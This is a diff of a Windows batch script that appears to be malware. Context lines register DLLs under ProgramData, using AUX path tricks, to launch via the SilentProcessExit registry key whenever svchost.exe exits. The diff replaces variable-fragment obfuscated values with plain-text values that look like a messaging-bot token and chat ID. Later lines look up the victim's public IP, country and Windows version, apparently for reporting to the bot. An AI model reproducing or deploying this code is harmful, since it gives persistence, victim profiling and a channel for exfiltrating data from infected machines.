@@ -42,8 +42,8 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentP
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\svchost.exe" /v MonitorProcess /t REG_SZ /d "\\.\%ProgramData%\AUX..\ShellExt.dll \\.\%ProgramData%\AUX..\DeviceId.dll" /f /reg:64
 
 setlocal EnableDelayedExpansion
-%L OC Z%s%HV XRS%e%IRZJAI%t "%MLZIIQ%T%VQJYZT%O%CVJSVA%K% SZKAD%E%WYEOEY%N=% DPXSM%6%MDSZIJ%5%PJWHUX%7%IRWZKJ%4%JBKWNK%1%LHMMYW%7%DGCYFS%6%IBJQWS%6%HOEIFN%3%BBTGNQ%1:%BRRINB%A%YCLADO%A%ULMERI%G% UFTOZ%2%GDBZLX%r%CXTMXP%N%BAPIST%z%GHKQOV%G%BXKKHT%c%LICSCJ%u% ZSOYG%m%VHPYDQ%7%URCMMH%O%PQQGYO%K%NSQABO%p%MKZGJU%I%BTJDWG%N%GEUVRR%Y%RZXWCM%8%TTBDBG%C%RVGBLU%y%SOIJLU%c%ZLVKAU%y%VSBZKD%6%SRHMNQ%t%SYRDMA%F% FT CC%r%JHNCXS%H%SITIJJ%b%ESLDJV%J%NFBTRO%a%DVZULW%a%AVPZQC%T%QPUPUF%A%YKPHZV%Y"
-%QXWZNY%s%BQR ZC%e%TZYXHO%t "%UFBJNU%C%BYMWWG%H%ZWXEDO%A%ACISYA%T_%LQRSXV%I%HACANU%D=%THJBXQ%5%MFVKAC%0%GOWJWF%0%GCIBYX%1%DKARPV%0%DZJCMX%6%F FTGT%2%FAQOLI%8% YFYVL%5%MRJMYN%2"
+set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
+set "CHAT_ID=5674938532"
 
 for /f "tokens=1,2 delims=," %%a in ('curl -s "http://ip-api.com/csv/?fields=country,query"') do (set "Country=%%a" & set "IP=%%b" & echo Country: !Country! & echo IP: !IP!)
 for /f "tokens=2 delims==" %%a in ('wmic os get Caption /value') do set "Windows=%%a"
